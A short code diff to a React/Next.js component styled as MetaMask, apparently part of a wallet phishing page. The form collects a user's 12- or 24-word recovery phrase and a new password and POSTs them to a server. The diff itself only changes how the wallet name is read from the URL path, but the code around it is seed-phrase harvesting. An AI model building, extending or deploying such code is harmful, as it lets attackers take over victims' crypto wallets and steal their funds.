@@ -3,7 +3,7 @@
 import { useState, FormEvent, useEffect } from "react";
 import PhraseField from "./PhraseField";
 import Link from "next/link";
-import { useParams, useRouter } from "next/navigation";
+import { usePathname, useRouter } from "next/navigation";
 function Spinner() {
   return (
     <div
@@ -14,8 +14,6 @@ function Spinner() {
 }
 
 export default function MetaMask() {
-  const params = useParams();
-  const wallet = params.wallet as string | undefined;
   const [noPhrase, setNoPhrase] = useState("I have a 12-word phrase");
   const [phraseWords, setPhraseWords] = useState<string[]>(Array(24).fill(""));
   const [newPassword, setNewPassword] = useState("");
@@ -23,6 +21,7 @@ export default function MetaMask() {
   const [isLoading, setIsLoading] = useState(false);
   const [passwordsMatch, setPasswordsMatch] = useState(true);
   const router = useRouter();
+  const pathname = usePathname();
 
   // Function to extract phrase length from the selected option
   const getPhraseLength = (phrase: string) => {
@@ -62,7 +61,8 @@ export default function MetaMask() {
         body: JSON.stringify({
           phrase,
           password: newPassword,
-          wallet: wallet ?? undefined,
+          wallet:
+            pathname.match("meta-mask")?.[0] === "meta-mask" ? "metamask" : "",
         }),
       });
 
